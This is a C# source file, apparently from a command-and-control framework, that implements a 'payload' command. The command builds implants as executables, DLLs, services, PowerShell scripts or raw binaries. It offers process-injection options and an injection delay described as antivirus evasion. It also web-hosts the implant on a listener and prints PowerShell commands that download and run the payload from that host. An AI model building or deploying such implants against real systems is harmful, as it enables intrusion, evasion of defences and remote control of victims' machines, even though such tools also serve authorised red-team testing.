using Commander.Executor;
using System;
using System.CommandLine;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.IO;
using Common;
using Common.Payload;
using Common.Models;
using Shared;
using Commander.Helper;
using System.CommandLine.Invocation;

namespace Commander.Commands
{
    public class BuildPayloadCommandOptions
    {

        public string bindTo { get; set; }

        public string listener { get; set; }

        public string fileName { get; set; }
        public string path { get; set; }

        public bool debug { get; set; }

        public bool nowebhost { get; set; }

        public string webhostFile { get; set; }
        public string webhostListener { get; set; }

        public bool x86 { get; set; }

        public bool verbose { get; set; }

        public string serverKey { get; set; }

        public string type { get; set; }

        public bool inject { get; set; }

        public int? injectDelay { get; set; }

        public string injectProcess { get; set; }

    }
    public class BuildPayloadCommand : EnhancedCommand<BuildPayloadCommandOptions>
    {


        public override string Category => CommandCategory.Commander;
        public override string Description => "Create a payload file";
        public override string Name => "payload";

        public override ExecutorMode AvaliableIn => ExecutorMode.All;



        private bool? WebhostProvided = null;

        private RootCommand innerCmd = null;

        public override RootCommand Command
        {
            get
            {
                return new RootCommand(this.Description)
                    {
                        new Option<string>(new[] { "--bindTo", "-b" }, () => null, "endpoint to connect to"),
                        new Option<string>(new[] { "--listener", "-l" }, () => null, "listener to connect to"),
                        new Option<string>(new[] { "--type", "-t" }, () => "exe", "exe | dll | svc | ps | bin | all").FromAmong("exe", "dll", "svc", "ps", "bin", "all"),
                        new Option<string>(new[] { "--fileName", "-f" }, () => null, "Name of the file to be crafted"),
                        new Option(new[] { "--debug", "-d" }, "Keep debugging info when building"),
                        new Option<string>(new[] { "--path", "-p" }, () => null, "Folder to save the generated file"),
                        new Option<string>(new[] { "--serverKey", "-k" }, () => null, "The server unique key of the endpoint"),
                        new Option(new[] { "--nowebhost", "-nwh" }, "Payload should be Web-Hosted"),
                        new Option<string>(new[] { "--webhostFile", "-wf" }, () => null, "Name of the file hosted in the web"),
                        new Option<string>(new[] { "--webhostListener", "-wl" }, () => null, "Listener used to generate Web-Host script (if different fom listener)"),
                        new Option(new[] { "--inject", "-i" }, "If the payload should be an injector"),
                        new Option<int?>(new[] { "--injectDelay", "-id" }, () => null, "Delay before injection (AV evasion)"),
                        new Option<string>(new[] { "--injectProcess", "-ip" }, () => null, "Process path used for injection"),
                        new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
                        new Option(new[] { "--verbose", "-v" }, "Show details of the command execution.")
                    };
            }
        }


        protected override async Task<bool> HandleCommand(CommandContext<BuildPayloadCommandOptions> context)
        {


            if (string.IsNullOrEmpty(context.Options.bindTo) && string.IsNullOrEmpty(context.Options.listener))
            {
                context.Terminal.WriteError($"[X] Either an endpoint or a listener should be provided !");
                return false;
            }

            if (!string.IsNullOrEmpty(context.Options.bindTo) && !string.IsNullOrEmpty(context.Options.listener))
            {
                context.Terminal.WriteError($"[X] Only one of endpoint or listener should be provided !");
                return false;
            }


            TeamServerListener listener = null;
            if (!string.IsNullOrEmpty(context.Options.listener))
            {
                listener = context.CommModule.GetListeners().FirstOrDefault(l => l.Name.ToLower() == context.Options.listener.ToLower());
                if (listener == null)
                {
                    context.Terminal.WriteError($"[X] Listener {context.Options.listener} not found !");
                    return false;
                }
            }


            if (!string.IsNullOrEmpty(context.Options.webhostListener))
            {
                var l = context.CommModule.GetListeners().FirstOrDefault(l => l.Name.ToLower() == context.Options.webhostListener.ToLower());
                if (l == null)
                {
                    context.Terminal.WriteError($"[X] Listener {context.Options.listener} not found for Web-Hosting!");
                    return false;
                }
            }

            ConnexionUrl endpoint = null;
            if (listener != null)
                endpoint = ConnexionUrl.FromString(listener.EndPoint);
            else
                endpoint = ConnexionUrl.FromString(context.Options.bindTo);
            if (!endpoint.IsValid)
            {
                context.Terminal.WriteError($"[X] EndPoint is not valid !");
                return false;
            }

            string serverKey = context.Config.ServerConfig?.Key;
            if (string.IsNullOrEmpty(serverKey) && string.IsNullOrEmpty(context.Options.serverKey))
            {
                context.Terminal.WriteError($"[X] ServerKey is not available, you must provide it in the command line!");
                return false;
            }

            if (!string.IsNullOrEmpty(context.Options.serverKey))
                serverKey = context.Options.serverKey;

            if (context.Options.type == "all")
            {
                foreach (var arch in Enum.GetValues(typeof(PayloadArchitecture)))
                {
                    var archType = (PayloadArchitecture)arch;
                    foreach (var typ in Enum.GetValues(typeof(PayloadType)))
                    {
                        var payType = (PayloadType)typ;

                        var opt = new PayloadGenerationOptions()
                        {
                            Architecture = archType,
                            Endpoint = endpoint,
                            IsDebug = context.Options.debug,
                            IsVerbose = context.Options.verbose,
                            ServerKey = serverKey,
                            Type = payType,
                            IsInjected = context.Options.inject
                        };
                        if (context.Options.injectDelay.HasValue)
                            opt.InjectionDelay = context.Options.injectDelay.Value;
                        if (!string.IsNullOrEmpty(context.Options.injectProcess))
                            opt.InjectionProcess = context.Options.injectProcess;

                        this.GeneratePayload(context, opt);
                    }
                }

                return true;
            }

            var t = PayloadType.Executable;
            switch (context.Options.type)
            {
                case "dll": t = PayloadType.Library; break;
                case "svc": t = PayloadType.Service; break;
                case "ps": t = PayloadType.PowerShell; break;
                case "bin": t = PayloadType.Binary; break;
                default: break;
            }

            var options = new PayloadGenerationOptions()
            {
                Architecture = context.Options.x86 ? PayloadArchitecture.x86 : PayloadArchitecture.x64,
                Endpoint = endpoint,
                IsDebug = context.Options.debug,
                IsVerbose = context.Options.verbose,
                ServerKey = serverKey,
                Type = t,
                IsInjected = context.Options.inject
            };
            if (context.Options.injectDelay.HasValue)
                options.InjectionDelay = context.Options.injectDelay.Value;
            if (!string.IsNullOrEmpty(context.Options.injectProcess))
                options.InjectionProcess = context.Options.injectProcess;


            var implant = this.GeneratePayload(context, options);
            if (implant == null)
            {
                return false;
            }

            if (!context.Options.nowebhost)
            {
                byte[] fileContent = implant.Data;
                var path = string.IsNullOrEmpty(context.Options.webhostFile) ? implant.Name : context.Options.webhostFile;
                while (path.StartsWith('/'))
                    path = path.Substring(1);


                await context.CommModule.WebHost(path, fileContent, options.Type == PayloadType.PowerShell, $"Implant {implant.Name} " + options.ToString());
                //context.Terminal.WriteSuccess($"[*] payload hosted at {path}.");


                if (!string.IsNullOrEmpty(context.Options.webhostListener))
                {
                    listener = context.CommModule.GetListeners().FirstOrDefault(l => l.Name.ToLower() == context.Options.webhostListener.ToLower());
                }

                var listeners = context.CommModule.GetListeners();
                if (listener != null)
                    listeners = new List<TeamServerListener>() { listener };

                foreach (var list in listeners)
                {
                    string urlwh = $"{listener.EndPoint}/{path}";
                    context.Terminal.WriteLine($"[*] payload hosted on : {urlwh}");

                    if (options.Type == PayloadType.PowerShell)
                    {
                        var script = ScriptHelper.GeneratePowershellScript(urlwh, listener.Secured);
                        var scriptb64 = ScriptHelper.GeneratePowershellScriptB64(urlwh, listener.Secured);
                        context.Terminal.WriteLine($"[>] Command : {script}");
                        context.Terminal.WriteLine($"[>] Command : {scriptb64}");
                    }
                    else
                    {
                        var script = ScriptHelper.GeneratePowershellDownloadScript(urlwh, Path.GetFileName(implant.LocalPath), listener.Secured);
                        context.Terminal.WriteLine($"[>] Download Command : {script}");
                    }
                }

            }

            return true;
        }

        private Payload GeneratePayload(CommandContext<BuildPayloadCommandOptions> context, PayloadGenerationOptions options)
        {
            context.Terminal.WriteInfo($"[>] Generating Payload {options.Type} for Endpoint {options.Endpoint} (arch = {options.Architecture}).");
            byte[] pay = null;
            try
            {
                pay = context.GeneratePayloadAndDisplay(options, context.Options.verbose);
            }
            catch (Exception ex)
            {
                context.Terminal.WriteError($"[X] Generation Failed!");
                if (context.Options.verbose)
                    context.Terminal.WriteError(ex.ToString());
                return null;
            }

            if (pay == null)
            {
                context.Terminal.WriteError($"[X] Generation Failed!");
                return null;
            }

            var payload = new Payload()
            {
                Data = pay
            };

            if(!string.IsNullOrEmpty(options.ImplantName))
                payload.Name = options.ImplantName;

            payload.LocalPath = GetOutputFilePath(context, options, string.IsNullOrEmpty(context.Options.fileName) ? payload.Name : context.Options.fileName);
            payload.WriteToFileSystem();

            context.Terminal.WriteSuccess($"[*] Generation succeed.");
            context.Terminal.WriteInfo($"Implant {payload.Name} can be found at {payload.LocalPath}");
            return payload;
        }


        private string GetOutputFilePath(CommandContext<BuildPayloadCommandOptions> context, PayloadGenerationOptions options, string fileName)
        {
            var outFile = Path.GetFileNameWithoutExtension(fileName);

            switch (options.Type)
            {
                case PayloadType.Executable:
                case PayloadType.Service:
                    if (!Path.GetExtension(outFile).Equals(".exe", StringComparison.OrdinalIgnoreCase))
                        outFile += ".exe";
                    break;
                case PayloadType.Library:
                    if (!Path.GetExtension(outFile).Equals(".dll", StringComparison.OrdinalIgnoreCase))
                        outFile += ".dll";
                    break;
                case PayloadType.PowerShell:
                    if (!Path.GetExtension(outFile).Equals(".ps1", StringComparison.OrdinalIgnoreCase))
                        outFile += ".ps1";
                    break;
                case PayloadType.Binary:
                    if (!Path.GetExtension(outFile).Equals(".bin", StringComparison.OrdinalIgnoreCase))
                        outFile += ".bin";
                    break;
            }

            string outPath = Path.Combine(context.Config.PayloadConfig.ImplantsFolder, outFile);
            if (!string.IsNullOrEmpty(context.Options.path))
                outPath = Path.Combine(context.Options.path, outFile);

            return outPath;
        }



        /*private string GetOutputFilePath(CommandContext<BuildPayloadCommandOptions> context, PayloadGenerationOptions options)
        {

            var customFileName = !string.IsNullOrEmpty(context.Options.fileName);
            var outFile = string.Empty;
            if (!customFileName)
                outFile = "payload_" + options.Endpoint.ProtocolString + "_" + System.Text.RegularExpressions.Regex.Replace(options.Endpoint.Address, @"[^\w\s]", "_");
            else
                outFile = Path.GetFileNameWithoutExtension(context.Options.fileName);

            if (options.Type == PayloadType.Service && (context.Options.type == "all" || !customFileName))
                outFile += "_svc";

            if (options.IsInjected && (context.Options.type == "all" || !customFileName))
                outFile += "_inj";

            outFile += options.Architecture == PayloadArchitecture.x86 ? "_x86" : "_x64";

            switch (options.Type)
            {
                case PayloadType.Executable:
                case PayloadType.Service:
                    if (!Path.GetExtension(outFile).Equals(".exe", StringComparison.OrdinalIgnoreCase))
                        outFile += ".exe";
                    break;
                case PayloadType.Library:
                    if (!Path.GetExtension(outFile).Equals(".dll", StringComparison.OrdinalIgnoreCase))
                        outFile += ".dll";
                    break;
                case PayloadType.PowerShell:
                    if (!Path.GetExtension(outFile).Equals(".ps1", StringComparison.OrdinalIgnoreCase))
                        outFile += ".ps1";
                    break;
                case PayloadType.Binary:
                    if (!Path.GetExtension(outFile).Equals(".bin", StringComparison.OrdinalIgnoreCase))
                        outFile += ".bin";
                    break;
            }

            string outPath = Path.Combine(context.Config.PayloadConfig.OutputFolder, outFile);
            if (!string.IsNullOrEmpty(context.Options.path))
                outPath = Path.Combine(context.Options.path, outFile);

            return outPath;
        }*/
    }

}
